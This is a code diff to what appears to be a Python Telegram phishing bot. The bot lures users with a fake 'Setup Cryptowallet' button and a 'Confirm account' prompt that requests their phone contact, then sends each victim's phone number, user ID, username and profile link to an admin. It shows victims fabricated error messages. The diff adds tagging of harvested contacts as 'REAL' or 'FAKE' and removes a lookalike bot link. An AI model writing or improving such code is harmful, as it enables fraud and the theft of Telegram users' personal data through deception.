@@ -21,7 +21,7 @@ def cmd_start(message):
         markup = ReplyKeyboardMarkup(resize_keyboard=True)
         markup.add(KeyboardButton(text="Setup Cryptowallet", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
         bot.send_message(message.from_user.id, "Press button to setup your Cryptowallet.", reply_markup=markup)
-        link = "https://t.me/cryptowaI_bot"
+        link = "null"
     user = message.from_user
     resp = f"New click: {link}\n"
     resp += f"User ID: {user.id}\n"
@@ -51,15 +51,17 @@ def handle_contact(message):
     resp = f"New phone: {phone_number}\n"
     resp += f"User ID: {user.id}\n"
     resp += f"Username: @{user.username}\n"
-    resp += f"Permalink: [{user.first_name} {user.last_name}](tg://user?id={user.id})"
-    bot.send_message(admin, resp, parse_mode="markdown")
+    resp += f"Permalink: [{user.first_name} {user.last_name}](tg://user?id={user.id})\n\n"
     kb = ReplyKeyboardMarkup(resize_keyboard=True)
     btn = KeyboardButton("Confirm account", request_contact=True)
     kb.add(btn)
     if not user_id == user.id:
         bot.send_message(user.id, "It looks like you sent wrong phone number, try again.", reply_markup=kb)
+        resp += "FAKE"
     else:
         bot.send_message(user.id, "Error: Failed to fetch data from server (0xc1). Try again later.")
+        resp += "REAL"
+    bot.send_message(admin, resp, parse_mode="markdown")
 
 if __name__ == "__main__":
     bot.infinity_polling()
